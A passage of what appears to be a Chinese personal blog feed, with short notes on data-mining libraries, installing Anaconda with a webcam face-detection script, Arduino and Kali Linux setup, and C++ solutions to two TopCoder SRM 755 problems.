        <content type="html"><![CDATA[<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>Python相关的第三方库</p><ul><li>Numpy</li><li>Scipy</li><li>Matplotlib</li><li>Pandas</li><li>Scikit-Learn</li><li>Keras</li><li>Gensim</li></ul><p>Anaconda发行版自带了Numpy, Scipy, Matplotlib, Pandas, Scikit-Learn</p><h2 id="数据探索"><a href="#数据探索" class="headerlink" title="数据探索"></a>数据探索</h2><h3 id="数据质量分析"><a href="#数据质量分析" class="headerlink" title="数据质量分析"></a>数据质量分析</h3><p>脏数据包括以下内容</p><ul><li>缺失值</li><li>异常值</li><li>不一致的值</li><li>重复数据及含有特殊符号的数据</li></ul><h3 id="数据特征分析"><a href="#数据特征分析" class="headerlink" title="数据特征分析"></a>数据特征分析</h3><ul><li>分布分析</li><li>对比分析</li></ul>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> data_analysis </tag>
            
            <tag> data_mining </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>anaconda安装 &amp; 人脸识别</title>
      <link href="/blog/install-anaconda/"/>
      <url>/blog/install-anaconda/</url>
      
        <content type="html"><![CDATA[<p>一个数据科学的Python库，我从这里下的Python</p><p>安装opencv</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install opencv-python</span><br></pre></td></tr></table></figure><p>安装dlib 和 face_recognition</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install dlib</span><br><span class="line">pip install face_recognition</span><br></pre></td></tr></table></figure><p>face_recognition依赖dlib，如果安装dlib报了一个cmake的错误，因为没有c编译器，所以<br><code>pip install cmake</code> 就好了</p><p>查看视频设备</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /dev/video*</span><br></pre></td></tr></table></figure><p>一个简单的人脸识别代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># face_detector.py</span></span><br><span class="line"><span class="comment"># import libraries</span></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> face_recognition</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get a reference to webcam </span></span><br><span class="line">video_capture = cv2.VideoCapture(<span class="string">"/dev/video0"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize variables</span></span><br><span class="line">face_locations = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="comment"># Grab a single frame of video</span></span><br><span class="line">    ret, frame = video_capture.read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Convert the image from BGR color (which OpenCV uses) to RGB color (which face_recognition uses)</span></span><br><span class="line">    rgb_frame = frame[:, :, ::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Find all the faces in the current frame of video</span></span><br><span class="line">    face_locations = face_recognition.face_locations(rgb_frame)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Display the results</span></span><br><span class="line">    <span class="keyword">for</span> top, right, bottom, left <span class="keyword">in</span> face_locations:</span><br><span class="line">        <span class="comment"># Draw a box around the face</span></span><br><span class="line">        cv2.rectangle(frame, (left, top), (right, bottom), (<span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>), <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Display the resulting image</span></span><br><span class="line">    cv2.imshow(<span class="string">'Video'</span>, frame)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Hit 'q' on the keyboard to quit!</span></span><br><span class="line">    <span class="keyword">if</span> cv2.waitKey(<span class="number">1</span>) &amp; <span class="number">0xFF</span> == ord(<span class="string">'q'</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Release handle to the webcam</span></span><br><span class="line">video_capture.release()</span><br><span class="line">cv2.destroyAllWindows()</span><br></pre></td></tr></table></figure></p><p>参考<br><a href="https://www.analyticsvidhya.com/blog/2018/12/introduction-face-detection-video-deep-learning-python/" target="_blank" rel="noopener">https://www.analyticsvidhya.com/blog/2018/12/introduction-face-detection-video-deep-learning-python/</a></p>]]></content>
      
      
      <categories>
          
          <category> install </category>
          
      </categories>
      
      
        <tags>
            
            <tag> install </tag>
            
            <tag> anaconda </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>arduino安装</title>
      <link href="/blog/install-arduino/"/>
      <url>/blog/install-arduino/</url>
      
        <content type="html"><![CDATA[<p>我在先Windows下安装的..<br>直接贴网址算了…<br><a href="https://www.arduino.cn/thread-82298-1-1.html" target="_blank" rel="noopener">https://www.arduino.cn/thread-82298-1-1.html</a><br><a href="https://www.arduino.cn/thread-5838-1-1.html" target="_blank" rel="noopener">https://www.arduino.cn/thread-5838-1-1.html</a></p><p>历时n个小时后，终于下完装完了？？这下载速度也太慢了吧…</p><p>update 20190514 22:25</p>]]></content>
      
      
      <categories>
          
          <category> install </category>
          
      </categories>
      
      
        <tags>
            
            <tag> install </tag>
            
            <tag> arduino </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali下载 &amp; 安装</title>
      <link href="/blog/install-kali/"/>
      <url>/blog/install-kali/</url>
      
        <content type="html"><![CDATA[<p>找到一个kali的下载地址…<br><a href="http://cdimage.kali.org/" target="_blank" rel="noopener">http://cdimage.kali.org/</a></p><p>i386    - 32位处理器<br>amd64   - 64位处理器</p><p>KDE - Kool Desktop Environment<br>xfce - Xtra fine computing environment轻量级桌面<br>lxde - 基于GTK2的美观和国际化的桌面环境<br>light - 轻量级系统</p><p>我下的是<a href="http://cdimage.kali.org/kali-2019.1/kali-linux-xfce-2019.1-amd64.iso" target="_blank" rel="noopener">kali-linux-xfce-2019.1-amd64.iso</a></p><p>然后跟安装Ubuntu差不多…<br>用UltraISO把磁盘映像写到U盘里。<br>好久没装系统，这软件都快忘怎么用了…要先打开再写到磁盘映像。<br>注意这个写入方式要改一下，不然安装不了！！！！！改成RAW</p><p>然后从U盘启动，图形化安装…</p><p>我会说我装了3遍才装到移动硬盘里打开吗？？？？？<br>安装的时候分区一个主分区Ext4挂载/， 一个逻辑分区swap， 不需要boot<br>因为我不想把整个盘都装上，所以手动分区，/ 256G, swap 8.5G<br>最后把GRUB引导添加到sdc我移动硬盘，然后启动就一个-？？？<br>我以为是我哪步搞错了，又重新试了一下，还是一个-？？？？<br>最后看到一个装双系统的，他把引导挂到了某个分区，我试了一下，挂到了/dev/sdc1<br>成功了？？？？？？我？？？？</p><p>我是一个Kali安装时长6h的个人练习生。</p><p>然后用root登进去以后，新建了一个用户，我只写了<code>useradd beiyu</code>，然后….进不去…<br>要<code>useradd -m beiyu</code>这样才能建立用户目录…<br><code>passwd</code>修改密码，<code>userdel</code> 删除用户，<code>cat /etc/passwd</code> 可以查看用户<br>暂时先写这么多…</p><p>update: 20190514 14:18</p><hr><p>一开始以用户登录不显示路径…上下键还没法查历史命令…原来是bash没设置…<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh</span><br><span class="line">chsh -s /bin/bash beiyu</span><br></pre></td></tr></table></figure></p><p>logout注销重登才生效</p><p>没法sudo命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br><span class="line">visudo</span><br><span class="line">root ALL=(ALL:ALL) ALL</span><br><span class="line">beiyuALL=(ALL) ALL</span><br></pre></td></tr></table></figure></p><p>安装 及其依赖<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dpkg -i *.deb</span><br><span class="line">sudo apt-get -f install</span><br></pre></td></tr></table></figure></p><p>chrome extension<br>chrome更新后无法直接拖入插件了，要进入开发者模式，然后把插件当成zip解压再安装<br>development mode - unzip ggfwzs.crx - install</p><p>update: 20190514 20:05</p><hr><p>root 无法打开chrome 需要加—no-sandbox</p><p>update: 20190515 18:35</p><hr><p>忽然发现之前安装不了依赖的原因是自己更新了源却没有update apt…<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install update</span><br></pre></td></tr></table></figure></p><p>另外截图工具：<br>scrot</p><p>update: 20190519 13:09</p>]]></content>
      
      
      <categories>
          
          <category> install </category>
          
      </categories>
      
      
        <tags>
            
            <tag> install </tag>
            
            <tag> kali </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TopCoderSRM755Div1</title>
      <link href="/blog/problem-TopCoderSRM755/"/>
      <url>/blog/problem-TopCoderSRM755/</url>
      
        <content type="html"><![CDATA[<p>Google CodeJam Round1A没赶上做，刚好有场SRM，然后就打了<br>当场只做了T1…T2没调完…<br>果然老年人…<br>好久没做Topcoder格式都快忘了，扒了Leanote的模板</p><p>ps.掉rating了..</p><p>T1<br>Description<br>$n$个数字，$n+1$个位置，用每次移动一步，排成正确顺序。<br>$n\leqslant 500$</p><p>Solution<br>这其实就是找环就完了，随便把一个放在最后，然后一个个移动就好了…<br>其实这是个排列，当时读题的时候没看到…然后想复杂了许多，所以代码有点长…</p><p>Code<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mpr make_pair</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> x first</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> y second</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> debug(a) cout&lt;&lt;(#a)&lt;&lt;<span class="meta-string">"="</span>&lt;&lt;a&lt;&lt;<span class="meta-string">" "</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> LL;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">100050</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> M = <span class="number">205</span>;</span><br><span class="line"><span class="keyword">const</span> LL p = <span class="number">1000000007</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> oo = <span class="number">0x3fffffff</span>;</span><br><span class="line"><span class="keyword">const</span> LL OO = <span class="number">1e18</span>;</span><br><span class="line"><span class="function">LL <span class="title">Pow</span><span class="params">(LL a,LL b,LL r=<span class="number">1</span>)</span> </span>&#123; <span class="keyword">for</span>(;b;b&gt;&gt;=<span class="number">1</span>,a=a*a%p) <span class="keyword">if</span>(b&amp;<span class="number">1</span>) r=r*a%p;<span class="keyword">return</span> r; &#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> LL <span class="title">in</span><span class="params">(LL x=<span class="number">0</span>,<span class="keyword">char</span> ch=getchar(),<span class="keyword">int</span> v=<span class="number">1</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(ch&gt;<span class="string">'9'</span> || ch&lt;<span class="string">'0'</span>) v=ch==<span class="string">'-'</span>?<span class="number">-1</span>:v,ch=getchar();</span><br><span class="line">    <span class="keyword">while</span>(ch&gt;=<span class="string">'0'</span> &amp;&amp; ch&lt;=<span class="string">'9'</span>) x=x*<span class="number">10</span>+ch-<span class="string">'0'</span>,ch=getchar();</span><br><span class="line">    <span class="keyword">return</span> x*v;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*end*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CS OneHandSort</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FC sortShelf</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CS</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; a, ans;</span><br><span class="line">    <span class="built_in">map</span>&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; rk, rrk, wz;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;n; i++) <span class="keyword">if</span>(rk[a[i]]!=i) <span class="keyword">return</span> i;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">addAns</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        ans.push_back(x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Sol</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> fx=a[x];</span><br><span class="line">        addAns(x);</span><br><span class="line">        <span class="keyword">for</span>(;;) &#123;</span><br><span class="line">            addAns(wz[rrk[x]]);</span><br><span class="line">            a[x]=rrk[x];</span><br><span class="line">            x=wz[rrk[x]];</span><br><span class="line">            <span class="keyword">if</span>(rrk[x]==fx) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        a[x]=fx;</span><br><span class="line">        addAns(n);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; FC(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; target) &#123;</span><br><span class="line">        a=target;</span><br><span class="line">        sort(a.begin(), a.end());</span><br><span class="line">        n=a.size();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;n; i++) &#123;</span><br><span class="line">        rk[a[i]]=i;</span><br><span class="line">        rrk[i]=a[i];</span><br><span class="line">        wz[target[i]]=i;</span><br><span class="line"><span class="comment">//        cout &lt;&lt; a[i] &lt;&lt; " " &lt;&lt; i &lt;&lt; endl;</span></span><br><span class="line">        &#125;</span><br><span class="line">        a=target;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> x=find();~x;x=find()) &#123;</span><br><span class="line">        Sol(x);</span><br><span class="line"><span class="comment">//        cout &lt;&lt; x &lt;&lt; endl;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line"><span class="comment">//  if(freopen("in.in","r",stdin)); </span></span><br><span class="line">    CS py;</span><br><span class="line">    LL n;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; a, ans;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n; i++) &#123;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; x;</span><br><span class="line">    a.push_back(x);</span><br><span class="line">    &#125;</span><br><span class="line">    ans=py.FC(a);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;ans.size(); i++) <span class="built_in">cout</span>&lt;&lt; ans[i]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></p><p>T2<br>Description<br>一个人拿着刷子刷路，给出要刷的路段，和每次最长能刷的距离，求最短路程<br>$n\leqslant 500, dStart[i] &lt; dEnd[i] &lt; 2\times 10^9$</p><p>Solution<br>这题倒着贪心，当时想出来了，有个地方写的有问题。<br>贪心为啥对呢…因为如果刷一次的话，最远路程便是最后一个，如果你还刷了前面的部分，那么第二次刷的路程就会变大。(没怎么想证明…对就vans了)</p><p>Code<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mpr make_pair</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> x first</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> y second</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> debug(a) cout&lt;&lt;(#a)&lt;&lt;<span class="meta-string">"="</span>&lt;&lt;a&lt;&lt;<span class="meta-string">" "</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> LL;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">550</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> M = <span class="number">205</span>;</span><br><span class="line"><span class="keyword">const</span> LL p = <span class="number">1000000007</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> oo = <span class="number">0x3fffffff</span>;</span><br><span class="line"><span class="keyword">const</span> LL OO = <span class="number">1e18</span>;</span><br><span class="line"><span class="function">LL <span class="title">Pow</span><span class="params">(LL a,LL b,LL r=<span class="number">1</span>)</span> </span>&#123; <span class="keyword">for</span>(;b;b&gt;&gt;=<span class="number">1</span>,a=a*a%p) <span class="keyword">if</span>(b&amp;<span class="number">1</span>) r=r*a%p;<span class="keyword">return</span> r; &#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> LL <span class="title">in</span><span class="params">(LL x=<span class="number">0</span>,<span class="keyword">char</span> ch=getchar(),<span class="keyword">int</span> v=<span class="number">1</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(ch&gt;<span class="string">'9'</span> || ch&lt;<span class="string">'0'</span>) v=ch==<span class="string">'-'</span>?<span class="number">-1</span>:v,ch=getchar();</span><br><span class="line">    <span class="keyword">while</span>(ch&gt;=<span class="string">'0'</span> &amp;&amp; ch&lt;=<span class="string">'9'</span>) x=x*<span class="number">10</span>+ch-<span class="string">'0'</span>,ch=getchar();</span><br><span class="line">    <span class="keyword">return</span> x*v;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*end*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CS OneHandRoadPainting</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FC fastest</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CS</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> n, m;</span><br><span class="line">    LL ans;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; a;</span><br><span class="line">    <span class="function">LL <span class="title">calc</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> t)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ((LL)x+x-(LL)(t<span class="number">-1</span>)*m)*t;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">LL <span class="title">FC</span><span class="params">(<span class="built_in">vector</span> &lt;<span class="keyword">int</span>&gt; dStart, <span class="built_in">vector</span> &lt;<span class="keyword">int</span>&gt; dEnd, <span class="keyword">int</span> paintPerBrush)</span> </span>&#123;</span><br><span class="line">    n=dStart.size();</span><br><span class="line">    ans=<span class="number">0</span>;</span><br><span class="line">    m=paintPerBrush;</span><br><span class="line"><span class="comment">//    for(int i=0; i&lt;n;i++) cout&lt;&lt; dStart[i] &lt;&lt; " " &lt;&lt; dEnd[i]&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">//cout &lt;&lt; m &lt;&lt; endl;</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;n; i++) a.push_back(dEnd[i]-dStart[i]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">0</span>;--i) &#123;</span><br><span class="line">    <span class="keyword">int</span> t=a[i]/m;</span><br><span class="line">    ans+=calc(dStart[i]+a[i], t);</span><br><span class="line"><span class="comment">//    cout &lt;&lt; calc(dStart[i]+a[i], t) &lt;&lt; endl;</span></span><br><span class="line">    </span><br><span class="line">            a[i]=a[i]%m;</span><br><span class="line">    t=m;</span><br><span class="line">    <span class="keyword">if</span>(a[i]==<span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">    ans+=<span class="number">2L</span>L*(dStart[i]+a[i]);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//    cout &lt;&lt; 2LL*(dStart[i]+a[i]) &lt;&lt; endl;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(;t&gt;<span class="number">0</span> &amp;&amp; i&gt;=<span class="number">0</span>; i--) &#123;</span><br><span class="line">    <span class="keyword">if</span>(a[i]&lt;=t) &#123;</span><br><span class="line">    t-=a[i], a[i]=<span class="number">0</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    a[i]-=t, t=<span class="number">0</span>, i++;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//debug(i),debug(ans);</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line"><span class="comment">//  if(freopen("in.in","r",stdin)); </span></span><br><span class="line">    CS py;</span><br><span class="line">    <span class="keyword">int</span> n, m, x;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; a,b;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n; i++) &#123;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; x;</span><br><span class="line">    a.push_back(x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n; i++) &#123;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; x;</span><br><span class="line">    b.push_back(x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; m;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; py.FC(a, b, m) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">3 1 10 20 4 13 22 2</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> problem </category>
          
      </categories>
      
      
        <tags>
            
            <tag> problem </tag>
            
            <tag> topcoder </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>线性代数笔记</title>
      <link href="/blog/note-algebra/"/>
      <url>/blog/note-algebra/</url>
      
